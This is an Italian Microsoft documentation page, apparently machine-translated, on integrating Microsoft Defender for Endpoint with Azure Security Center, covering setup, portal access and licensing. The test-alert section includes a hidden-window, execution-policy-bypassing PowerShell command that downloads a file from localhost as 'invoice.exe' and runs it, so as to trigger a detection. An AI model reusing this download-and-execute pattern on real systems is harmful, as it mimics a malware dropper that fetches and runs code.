---
title: Uso della licenza Microsoft Defender for endpoint inclusa nel centro sicurezza di Azure
description: Informazioni su Microsoft Defender per l'endpoint e sulla relativa distribuzione dal centro sicurezza di Azure.
services: security-center
documentationcenter: na
author: memildin
manager: rkarlin
ms.service: security-center
ms.devlang: na
ms.topic: how-to
ms.tgt_pltfrm: na
ms.workload: na
ms.date: 10/20/2020
ms.author: memildin
ms.openlocfilehash: 5645a2e0449a1929421f9444bf645f08ad0525e9
ms.sourcegitcommit: 192f9233ba42e3cdda2794f4307e6620adba3ff2
ms.translationtype: MT
ms.contentlocale: it-IT
ms.lasthandoff: 11/26/2020
ms.locfileid: "96296812"
---
# <a name="protect-your-endpoints-with-security-centers-integrated-edr-solution-microsoft-defender-for-endpoint"></a>Proteggi gli endpoint con la soluzione EDR integrata del Centro sicurezza: Microsoft Defender per endpoint

Microsoft Defender for endpoint è una soluzione di sicurezza completa di endpoint distribuita nel cloud. Le funzionalità principali sono:

- Valutazione e gestione delle vulnerabilità basate sul rischio 
- Riduzione della superficie di attacco
- Protezione basata sul comportamento e sulla protezione basata sul cloud
- Rilevamento e risposta degli endpoint (EDR)
- Analisi e correzione automatiche
- Servizi di caccia gestiti

> [!TIP]
> Originariamente lanciato come **Windows Defender ATP**, questo prodotto di rilevamento e risposta dell'endpoint è stato rinominato in 2019 come **Microsoft Defender ATP**.
>
> In Ignite 2020 è stata avviata la [suite Microsoft Defender XDR](https://www.microsoft.com/security/business/threat-protection) e questo componente EDR è stato rinominato **Microsoft Defender per endpoint**.


## <a name="availability"></a>Disponibilità

| Aspetto                          | Dettagli                                                                                                                                                                                                                                                                                                       |
|---------------------------------|:--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Stato della versione:                  | Disponibile a livello generale                                                                                                                                                                                                                                                                                      |
| Prezzi:                        | Richiede [Azure Defender per server](security-center-pricing.md)                                                                                                                                                                                                                                             |
| Piattaforme supportate:            | ![Sì](./media/icons/yes-icon.png) Macchine virtuali di Azure che eseguono Windows<br>![Sì](./media/icons/yes-icon.png) Computer Azure Arc che eseguono Windows|
| Versioni supportate di Windows:  | Defender for endpoint è integrato in Windows 10 1703 (e versioni successive) e Windows Server 2019.<br>Il Centro sicurezza supporta il rilevamento in Windows Server 2016, 2012 R2 e 2008 R2 SP1.<br>Il monitoraggio degli endpoint server con questa integrazione è stato disabilitato per i clienti di Office 365 GCC. |
| Autorizzazioni e ruoli obbligatori: | Per abilitare o disabilitare l'integrazione: **amministratore della sicurezza** o **proprietario**<br>Per visualizzare gli avvisi MDATP nel centro sicurezza: **lettore sicurezza**, **lettore**, **collaboratore gruppo di risorse**, **proprietario del gruppo di risorse**, amministratore della **sicurezza**, **proprietario della sottoscrizione** o **collaboratore della sottoscrizione**                         |
| Cloud:                         | ![Sì](./media/icons/yes-icon.png) Cloud commerciali.<br>![No](./media/icons/no-icon.png) Clienti GCC che eseguono carichi di lavoro in cloud di Azure globali<br>![Sì](./media/icons/yes-icon.png) US Gov<br>![No](./media/icons/no-icon.png) Governo cinese, altri governi                                                        |
|                                 |                                                                                                                                                                                                                                                                                                               |


## <a name="microsoft-defender-for-endpoint-features-in-security-center"></a>Funzionalità di Microsoft Defender per endpoint nel centro sicurezza

Microsoft Defender per endpoint offre:

- **Sensori di rilevamento post-violazione avanzati**. Defender per i sensori dell'endpoint per i computer Windows raccoglie un'ampia gamma di segnali comportamentali.

- **Rilevamento post-violazione basato su analisi e basato sul cloud**. Defender for endpoint si adatta rapidamente alle mutevoli minacce. sfruttando strumenti di analisi avanzata e Big Data. Viene amplificato dalla potenza del Intelligent Security Graph con segnali in Windows, Azure e Office per rilevare le minacce sconosciute. Fornisce avvisi interattivi e consente di reagire con tempestività.

- **Intelligence per le minacce**. Defender for endpoint genera avvisi quando identifica gli strumenti, le tecniche e le procedure degli utenti malintenzionati. Usa i dati generati dagli specialisti di minacce e dai team di sicurezza di Microsoft, integrati con intelligence fornita da partner.

Integrando Defender for endpoint con il Centro sicurezza, sarà possibile usufruire delle funzionalità aggiuntive seguenti:

- **Onboarding automatico**. Il Centro sicurezza abilita automaticamente Microsoft Defender per l'endpoint Sensor per tutti i server Windows monitorati dal centro sicurezza. Ad eccezione di quelli che eseguono Windows Server 2019, che devono essere caricati tramite script locali, oggetto Criteri di gruppo (GPO) o [Microsoft Endpoint Configuration Manager](https://docs.microsoft.com/mem/configmgr/) (in precedenza SCCM).

- **Riquadro singolo di vetro**. Nella console del Centro sicurezza viene visualizzato Microsoft Defender per gli avvisi degli endpoint. Per approfondire l'analisi, utilizzare Microsoft Defender per le pagine del portale dell'endpoint in cui verranno visualizzate informazioni aggiuntive, ad esempio l'albero del processo di avviso e il grafico dell'evento imprevisto. È anche possibile visualizzare una sequenza temporale dettagliata che mostra ogni comportamento per un determinato periodo, fino a un massimo di sei mesi.

    :::image type="content" source="./media/security-center-wdatp/microsoft-defender-security-center.png" alt-text="Microsoft Defender per il proprio Centro sicurezza di endpoint" lightbox="./media/security-center-wdatp/microsoft-defender-security-center.png":::

## <a name="microsoft-defender-for-endpoint-tenant-location"></a>Posizione del tenant di Microsoft Defender per endpoint

Quando si usa il Centro sicurezza di Azure per monitorare i server, viene creato automaticamente un tenant di Microsoft Defender per endpoint. I dati raccolti da Defender per l'endpoint vengono archiviati nella posizione geografica del tenant, come identificato durante il provisioning. Dati del cliente, in formato con pseudonimo, possono anche essere archiviati nei sistemi di archiviazione e di elaborazione centrali del Stati Uniti. 

Dopo aver configurato il percorso, non è possibile modificarlo. Se è necessario spostare i dati in un altro percorso, contattare supporto tecnico Microsoft per reimpostare il tenant.


## <a name="enabling-the-microsoft-defender-for-endpoint-integration"></a>Abilitazione di Microsoft Defender per l'integrazione degli endpoint

1. Abilitare **Azure Defender per i server**. Vedi [i prezzi del Centro sicurezza di Azure](security-center-pricing.md#enable-azure-defender).

    > [!NOTE]
    > Per proteggere i computer abilitati per Azure Arc, seguire le istruzioni riportate in [avvio rapido: connettere un computer ibrido con i server abilitati per Azure Arc](../azure-arc/servers/learn/quick-enable-hybrid-vm.md)

1. Se è già stato concesso in licenza e distribuito Microsoft Defender per gli endpoint sui server, rimuoverlo usando la procedura descritta in [offboard Windows Servers](/windows/security/threat-protection/microsoft-defender-atp/configure-server-endpoints#offboard-windows-servers).
1. Scegliere **Prezzi e impostazioni** dal menu del Centro sicurezza.
1. Selezionare la sottoscrizione da modificare.
1. Selezionare **Rilevamento delle minacce**.
1. Selezionare **Consenti a Microsoft Defender per l'endpoint di accedere ai dati** e selezionare **Salva**.

    :::image type="content" source="./media/security-center-wdatp/enable-integration-with-edr.png" alt-text="Abilitare l'integrazione tra il Centro sicurezza di Azure e la soluzione EDR Microsoft, Microsoft Defender per endpoint":::

    Il Centro sicurezza di Azure effettuerà automaticamente l'onboarding dei server a Microsoft Defender per l'endpoint. Il caricamento potrebbe richiedere fino a 24 ore.


## <a name="access-the-microsoft-defender-for-endpoint-portal"></a>Accedere a Microsoft Defender per endpoint Portal

1. Verificare che l'account utente disponga delle autorizzazioni necessarie. [Altre informazioni](/windows/security/threat-protection/microsoft-defender-atp/assign-portal-access)

1. Controllare se è presente un proxy o un firewall che blocca il traffico anonimo. Il Defender per l'endpoint Sensor si connette dal contesto del sistema, quindi è necessario consentire il traffico anonimo. Per garantire l'accesso senza ostacoli al Defender per endpoint Portal, seguire le istruzioni in [abilitare l'accesso agli URL del servizio nel server proxy](/windows/security/threat-protection/microsoft-defender-atp/configure-proxy-internet#enable-access-to-microsoft-defender-atp-service-urls-in-the-proxy-server).

1. Aprire il [portale di Microsoft Defender Security Center](https://securitycenter.windows.com/). Per altre informazioni sulle funzionalità e sulle icone del portale, vedere Panoramica del portale di [Microsoft Defender Security Center](/windows/security/threat-protection/microsoft-defender-atp/portal-overview). 

## <a name="send-a-test-alert"></a>Invia un avviso di test

Per generare un avviso di prova di Microsoft Defender per l'endpoint:

1. Creare una cartella ' C:\test-MDATP-test '.
1. Usare Desktop remoto per accedere a una macchina virtuale Windows Server 2012 R2 o Windows Server 2016.
1. Aprire una finestra della riga di comando.
1. Al prompt copiare ed eseguire il comando seguente. La finestra del prompt dei comandi verrà chiusa automaticamente.

    ```powershell
    powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe'); Start-Process 'C:\\test-MDATP-test\\invoice.exe'
    ```
    :::image type="content" source="./media/security-center-wdatp/generate-edr-alert.png" alt-text="Finestra del prompt dei comandi con il comando per generare un avviso di test.":::

1. Se il comando ha esito positivo, verrà visualizzato un nuovo avviso nel dashboard del Centro sicurezza di Azure e in Microsoft Defender per l'endpoint Portal. Possono trascorrere alcuni minuti prima che l'avviso venga visualizzato.
1. Per esaminare l'avviso nel centro sicurezza, passare a **avvisi di sicurezza** riga di comando di  >  **PowerShell sospetti**.
1. Dalla finestra di analisi selezionare il collegamento per passare a Microsoft Defender per endpoint Portal.


## <a name="faq-for-security-centers-integrated-microsoft-defender-for-endpoint"></a>Domande frequenti per l'endpoint integrato di Microsoft Defender per il Centro sicurezza

### <a name="what-are-the-licensing-requirements-for-microsoft-defender-for-endpoint"></a>Quali sono i requisiti di licenza per Microsoft Defender per l'endpoint?

Defender for endpoint è incluso senza costi aggiuntivi con **Azure Defender per i server**. In alternativa, può essere acquistato separatamente per 50 o più computer.


### <a name="how-do-i-switch-from-a-third-party-edr-tool"></a>Ricerca per categorie passare da uno strumento EDR di terze parti?

Le istruzioni complete per il passaggio da una soluzione endpoint non Microsoft sono disponibili nella documentazione di Microsoft Defender per l'endpoint: [Panoramica della migrazione](/windows/security/threat-protection/microsoft-defender-atp/switch-to-microsoft-defender-migration).
  


## <a name="next-steps"></a>Passaggi successivi

- [Funzionalità e piattaforme supportate dal Centro sicurezza di Azure](security-center-os-coverage.md)
- [Gestione delle raccomandazioni di sicurezza nel Centro sicurezza di Azure](security-center-recommendations.md): informazioni sul modo in cui le raccomandazioni semplificano la protezione delle risorse di Azure.